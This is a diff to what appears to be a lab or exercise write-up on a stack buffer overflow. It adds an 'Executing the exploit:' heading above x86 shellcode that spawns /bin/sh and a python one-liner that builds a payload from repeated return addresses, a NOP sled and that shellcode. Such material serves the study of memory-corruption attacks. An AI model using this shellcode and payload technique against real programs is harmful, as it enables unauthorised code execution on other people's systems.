@@ -72,6 +72,7 @@ Using gdb, we can determine that the hots variable is located at 0xffffd5c0 and 
 ##### Shellcode:
 \x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
 
+Executing the exploit:
 ```bash
 $ python -c 'print "\x4c\xd6\xff\xff"*8 + "\x90"*128 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"' > exploit_data
 $ <use gdb to read exploit_data, overwrite any null characters in host, and store the result in exp_file>
